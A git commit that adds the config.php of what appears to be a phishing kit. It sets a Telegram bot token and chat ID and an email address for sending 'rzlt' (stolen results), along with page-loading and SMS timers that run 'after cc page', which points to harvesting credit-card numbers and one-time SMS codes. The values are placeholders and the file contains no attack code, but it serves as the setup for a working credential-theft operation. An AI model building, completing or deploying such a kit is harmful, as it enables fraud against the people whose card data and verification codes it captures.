d8b3ae1c7648b4cb812aa8355291442b09163d39
ALADIN99I <131961453+ALADIN99I@users.noreply.github.com>
2025-01-28 22:58:30 +0100

    Add files via upload

---
+++ config.php
@@ -0,0 +1,15 @@
+<?php
+
+
+
+/* ━━━━━ telegram rzlt settings ━━━━━━ */
+$BotToken = "Bot Token";
+$ChatId = "Chat Id";
+/* ━━━━━ email rzlt settings ━━━━━ */
+$send_to_email = "1"; /* 1 for yes -  0 for no */ 
+$email = "email";
+/* ━━━━━ loading page time in mS (miliSeconds) ━━━━━ */
+$Loading_Timer = '5000';
+$SMS_Timer = '10000'; /* after cc page */ 
+$unlimited_SMS = '0';
+?>
